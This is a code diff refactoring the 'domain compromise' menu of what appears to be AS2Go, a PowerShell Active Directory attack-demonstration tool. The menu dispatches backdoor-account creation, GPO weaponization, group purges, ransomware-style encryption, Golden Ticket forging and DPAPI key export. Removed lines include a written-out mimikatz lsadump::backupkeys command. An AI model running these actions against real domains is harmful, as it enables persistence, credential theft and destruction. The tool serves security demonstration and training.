@@ -3,7 +3,7 @@
 Offers domain persistence, disruption, and demonstration-closing actions.
 
 .DESCRIPTION
-Presents a repeatable menu of final AS2Go actions and invokes the selected workflow after its confirmation steps.
+Presents a repeatable menu of final AS2Go actions and invokes the selected workflow.
 Options include creating an administrative backdoor user, modifying a selected GPO, removing privileged group
 memberships, disabling users or resetting passwords, and encrypting files through the ransomware demonstration.
 Other options export domain DPAPI backup keys, forge and inject a Golden Ticket, or restart configured victims.
@@ -22,7 +22,6 @@ Console messages and output from invoked commands; no dedicated result object is
 .NOTES
 Private AS2Go function. Run from an initialized AS2Go module session.
 Available actions depend on initialized module settings, tools, modules, and current permissions.
-The default menu sequence does not execute every listed action automatically.
 
 .COMPONENT
 Category: Main Function
@@ -36,43 +35,34 @@ function Invoke-ASPhase12DomainCompromise {
 
     ################################################################################
     #####                                                                      ##### 
-    #####    Phase 12 Domain Comprommise
+    #####    Phase 12 Domain Compromise
     #####                                                                      #####
     ################################################################################
 
     $info = Measure-FunctionRuntime -Begin
- 
-    $nextAnswer = "B"
 
-    $topicBackdoor = "Establish persistent domain access through a covert backdoor account"
-    $topicGPT = "Weaponize Group Policy Template (GPT) files for domain-wide compromise"
-    $topicPurge = "Purge all privileged group memberships to grant exclusive control to the backdoor account"
-    $topicUserAccount = "Disable user accounts or enforce password resets (retain backdoor control)"
-    $topicEncrypt = "Encrypt critical Domain Controller assets for strategic leverage"
-    $topicMasterKey = "Extract the DPAPI master key for credential and secret recovery"
-    $topicGoldenTicket = "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
-    $topicReboot = "Trigger coordinated reboot across accessible Domain Controllers"
-    $topicExit = "Exit AS2Go."
+    Update-WindowTitle -NewTitle $Script:Phase12
+    Set-ASConfig -Setting "LastStage" -Value $Script:Phase12
 
     Do {
 
-        Write-AS2GoOutput -Type Header -Message "Select a Final Action"
+        If (-not $SkipClearHost) { Clear-Host }
+
+        Write-AS2GoOutput -Type Header -Message "Domain Dominance & Persistence"
         Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
 
-        Write-Host "   B " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicBackdoor"
-        Write-Host "   T " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicGPT"
-        Write-Host "   P " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicPurge"
-        Write-Host "   U " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicUserAccount"
-        Write-Host "   E " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicEncrypt"
-        Write-Host "   K " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicMasterKey"
-        Write-Host "   G " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicGoldenTicket"
-        Write-Host "   R " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicReboot"
-        Write-Host "`n   X " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicExit"
-
-
+        $topicBackdoor = "Establish persistent domain access through a covert backdoor account"
+        $topicGPT = "Weaponize Group Policy Template (GPT) files for domain-wide compromise"
+        $topicPurge = "Purge all privileged group memberships to grant exclusive control to the backdoor account"
+        $topicUserAccount = "Disable user accounts or enforce password resets (retain backdoor control)"
+        $topicEncrypt = "Encrypt critical Domain Controller assets for strategic leverage"
+        $topicMasterKey = "Extract the DPAPI master key for credential and secret recovery"
+        $topicGoldenTicket = "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
+        $topicReboot = "Trigger coordinated reboot across accessible Domain Controllers"
+        $topicExit = "Exit AS2Go."
 
         If ($UnAttended) {
-            $answer = $nextAnswer
+            $answer = "B"
         }
         else {
 
@@ -86,47 +76,47 @@ function Invoke-ASPhase12DomainCompromise {
                 [pscustomobject] @{
                     Label = "&Backdoor"
                     Help  = $topicBackdoor
-                    Value = "B"
+                    Value = "Backdoor"
                 },
                 [pscustomobject] @{
                     Label = "GP&T"
                     Help  = $topicGPT
-                    Value = "T"
+                    Value = "GPT"
                 },
                 [pscustomobject] @{
                     Label = "&Purge"
                     Help  = $topicPurge
-                    Value = "P"
+                    Value = "Purge"
                 },
                 [pscustomobject] @{
                     Label = "&User Account"
                     Help  = $topicUserAccount
-                    Value = "U"
+                    Value = "UserAccount"
                 },
                 [pscustomobject] @{
                     Label = "Master &Key"
                     Help  = $topicMasterKey
-                    Value = "K"
+                    Value = "MasterKey"
                 },
                 [pscustomobject] @{
                     Label = "&Golden Ticket"
                     Help  = $topicGoldenTicket
-                    Value = "G"
+                    Value = "GoldenTicket"
                 },
                 [pscustomobject] @{
                     Label = "&Encrypt"
                     Help  = $topicEncrypt
-                    Value = "E"
+                    Value = "Encrypt"
                 },
                 [pscustomobject] @{
                     Label = "&Reboot"
                     Help  = $topicReboot
-                    Value = "R"
+                    Value = "Reboot"
                 },
                 [pscustomobject] @{
                     Label = "E&xit"
                     Help  = $topicExit
-                    Value = "X"
+                    Value = "Exit"
                 }
             )
             $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
@@ -134,176 +124,41 @@ function Invoke-ASPhase12DomainCompromise {
 
         switch ($answer) {
 
-            "B" {
-
-                If (-not $SkipClearHost) { Clear-Host }
-                Write-AS2GoOutput -Type  Header -M "Create a backdoor account with elevated group memberships for persistence"
-
-        
-                If ($UnAttended) {
-                    $answer = $Script:Yes 
-                }
-                else {
-                    $answer = Show-DecisionPrompt
-                }
-    
-                If ($answer -eq $Script:Yes) {
-                    New-BackDoorUser
-                    #If ($UnAttended) { Start-Sleep 2 } else { Pause }
-                }
-                $nextAnswer = "R"
-                $repeat = $Script:Yes 
+            "Backdoor" {
+                Invoke-BackdoorUserCreation
+                $repeat = $Script:Yes
             }
-            "P" {
-                If (-not $SkipClearHost) { Clear-Host }
-                Write-AS2GoOutput -Type  Header -M "Purge all privileged group memberships"
-                $answer = $Script:Yes
-                
-                If ($UnAttended) {
-                    $answer = $Script:Yes 
-                }
-    
-                If ($answer -eq $Script:Yes) {
-                    Invoke-GroupManipulation
-                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-                }
-                $NextStep = "T"
-                $repeat = $Script:Yes 
+            "Purge" {
+                Invoke-PrivilegeGroupPurge
+                $repeat = $Script:Yes
             }
-            "T" {
-                If (-not $SkipClearHost) { Clear-Host }
-                Write-AS2GoOutput -Type  Header -M "Manipulate Group Policy Templates (GPT) files"
-        
-                If ($UnAttended) {
-                    $answer = $Script:Yes 
-                }
-                else {
-                    $answer = Show-DecisionPrompt
-                }
-    
-                If ($answer -eq $Script:Yes) {
-
-                    $TargetGPO = Get-GPOLinkedOnDomain
-
-
-                    $TargetGPO = Get-TargetGPO
-
-
-                    
-                    if ([string]::IsNullOrEmpty($TargetGPO)) {
-                        Write-AS2GoOutput -Type CodeSnippet -Message "Domain Selection cancled by user"
-                    }
-                    else {
-                        New-GPOManipulation -ID $TargetGPO.ID.Guid -name $TargetGPO.DisplayName -domainDNS $TargetGPO.DomainDNS -server $TargetGPO.Server
-                    }
-                }
-                $nextAnswer = "U"
-                $repeat = $Script:Yes  
+            "GPT" {
+                Invoke-GPTManipulation
+                $repeat = $Script:Yes
             }
-            "U" {
-                If (-not $SkipClearHost) { Clear-Host }
-                Write-AS2GoOutput -Type  Header -M "Disable user accounts or/and enforce password resets"
-      
-                $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
-                $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
-    
-        
-                Write-host "  ... will ignore your new backdoor user " -NoNewline
-                Write-host $global:BDUser -ForegroundColor $Script:FGCHighLight -NoNewline
-                Write-Host " - $Smily"
-            
-                If ($UnAttended) {
-                    $answer = $Script:Yes 
-                }
-                else {
-                    $question = "Do you want to run these steps - Y or N? Default "
-                    $answer = Get-Answer -question $question -defaultValue $Script:Yes
-                }
-    
-                If ($answer -eq $Script:Yes) {
-                    #$Script:ASSearchBase = Get-ASConfig -Setting "MySearchBase"
-                    New-UserManipulation
-                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-                } 
-                $NextStep = "T"
-                $repeat = $Script:Yes   
+            "UserAccount" {
+                Invoke-UserAccountDisruption
+                $repeat = $Script:Yes
             }
-            "G" {
-                If (-not $SkipClearHost) { Clear-Host }
-
-                Write-AS2GoOutput -Type  Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
-                Write-AS2GoOutput -Type  Bullet -M "Step 1: Dump the NTLM Hash for 'krbtgt' account"
-                Write-AS2GoOutput -Type  Bullet -M "Step 2: Forge Golden Ticket"
-                Write-AS2GoOutput -Type  Bullet -M "Step 3: Use the Golden Ticket to achieve unrestricted Kerberos dominance"
-    
-                If ($UnAttended) {
-                    $answer = $Script:No 
-                }
-                else {
-                    $answer = Show-DecisionPrompt
-                }
-    
-                If ($answer -eq $Script:Yes) {
-                    Invoke-GoldenTicket
-                } 
-                $repeat = $Script:Yes  
+            "GoldenTicket" {
+                Invoke-GoldenTicketAttack
+                $repeat = $Script:Yes
             }
-            "E" {
-                #region  Step - ran ransomware attack? 
-                #Pause
-                If (-not $SkipClearHost) { Clear-Host }
-                Write-AS2GoOutput -Type  Header -M "Encrypt critical Domain Controller assets for strategic leverage"
-    
-                If ($UnAttended) {
-                    $answer = $Script:Yes 
-                }
-                else {
-                    $question = "Do you want to run this attack - Y or N? Default "
-                    #$answer = Get-Answer -question $question -defaultValue $Script:Yes
-                    $answer = $Script:Yes 
-                }
-
-                If ($answer -eq $Script:Yes) {
-                    #run functions
-                    New-RansomwareAttack -BackupShare $Script:ASBackupShare
-                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-                }
-                #endregion  Step - ran ransomware attack?
-                $repeat = $Script:Yes   
+            "Encrypt" {
+                Invoke-DomainEncryptionAttack
+                $repeat = $Script:Yes
             }
-            "K" {
-
-                If (-not $SkipClearHost) { Clear-Host }
-
-                Write-AS2GoOutput -Type  Header -M "Export DATA PROTECTION API master key"
-                Write-AS2GoOutput -Type  Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
-                Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
-
-                Write-Highlight -Text ".\mimikatz.exe ", """cd $Script:DefautExfiltrationFolder"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$Script:ASDC.$Script:ASFQDN", " /export", """ ""exit"""  `
-                    -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
-                Write-Host  ""
-
-                If ($UnAttended) {
-                    $answer = $Script:Yes 
-                }
-                else {
-                    $answer = Show-DecisionPrompt
-                }
-
-                If ($answer -eq $Script:Yes) {
-                    Export-DPAPIMasterKey
-                }
-
-                $repeat = $Script:Yes      
+            "MasterKey" {
+                Invoke-DPAPIMasterKeyExport
+                $repeat = $Script:Yes
             }
-            "R" {
-                #Pause
+            "Reboot" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Write-AS2GoOutput -Type  Header -M "Trigger coordinated reboot across accessible Domain Controllers"
+                Write-AS2GoOutput -Type Header -M "Trigger coordinated reboot across accessible Domain Controllers"
                 Restart-VictimMachines
                 $repeat = $Script:Yes
             }
-            "X" {
+            "Exit" {
                 Stop-AS2GoDemo -NextStepReboot $Script:No
                 $repeat = $Script:No
                 pause
@@ -311,14 +166,13 @@ function Invoke-ASPhase12DomainCompromise {
 
             default {
                 Write-Host "out of scope"
-                $repeat = $Script:Yes  
+                $repeat = $Script:Yes
             }
         }
 
         If (-not $SkipClearHost) { Clear-Host }
-  
+
     } Until ($repeat -eq $Script:No)
 
     Measure-FunctionRuntime -End -Details $info
-
 }
